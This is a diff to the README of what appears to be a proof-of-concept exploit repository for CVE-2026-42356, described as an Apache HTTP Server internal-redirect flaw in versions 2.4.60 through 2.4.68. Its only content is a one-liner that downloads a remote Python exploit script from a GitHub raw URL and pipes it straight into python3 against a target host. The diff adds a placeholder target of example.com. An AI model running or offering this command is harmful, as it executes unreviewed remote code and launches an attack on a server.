@@ -1,7 +1,8 @@
 # CVE-2026-42356 - Apache HTTPD Wrong Handler on Internal Redirect
 
 ```
-curl -sSL https://raw.githubusercontent.com/thankgod4rob/CVEs/main/2026-42356-apache-httpd/2026-42356.py | python3 - --target $TARGET -i
+TARGET=example.com
+curl -sSL "https://raw.githubusercontent.com/thankgod4rob/CVEs/main/2026-42356-apache-httpd/2026-42356.py" | python3 - --target "$TARGET" -i
 ```
 
 PoC for CVE-2026-42356 affecting Apache HTTP Server **2.4.60 through 2.4.68**.
